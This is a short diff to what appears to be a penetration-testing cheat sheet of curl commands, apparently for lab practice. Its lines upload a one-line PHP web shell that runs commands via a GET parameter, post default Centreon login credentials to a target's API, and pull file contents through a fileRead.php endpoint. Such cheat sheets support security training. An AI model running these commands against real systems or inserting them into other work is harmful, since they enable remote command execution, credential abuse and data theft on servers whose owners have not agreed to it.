@@ -1663,7 +1663,10 @@ curl -v -X OPTIONS http://$IP/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php
 
 # Simple curl POST request with login data
-curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
+curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
+
+curl -s  http://$IP/fileRead.php -d 'file=fileRead.php' | jq -r ."file"
+
 
 # Google Dork
 
